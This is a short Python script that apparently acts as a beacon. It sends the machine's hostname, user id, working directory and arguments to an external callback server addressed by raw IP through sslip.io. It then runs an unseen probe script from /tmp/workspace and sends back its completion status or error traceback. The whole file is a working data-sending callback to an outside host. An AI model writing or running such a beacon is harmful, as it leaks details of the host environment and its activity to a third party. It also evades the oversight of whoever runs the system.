#!/usr/bin/env python3
import json, os, pathlib, time, urllib.request, traceback
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-p1-textmarker-debug-20261106'
def post(x):
 try:
  r=urllib.request.Request(SINK,data=json.dumps(x,separators=(',',':')).encode(),method='POST',headers={'Content-Type':'application/json'})
  with urllib.request.urlopen(r,timeout=20) as q:return q.status
 except Exception as e:return repr(e)
post({'stage':'start','host':os.uname().nodename,'uid':os.getuid(),'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'cwd':os.getcwd(),'argv':os.sys.argv})
try:
 import runpy
 runpy.run_path('/tmp/workspace/snapgpt_probe.py',run_name='__main__')
 post({'stage':'after'})
except BaseException as e:
 post({'stage':'error','error':repr(e),'trace':traceback.format_exc()[-8000:]})
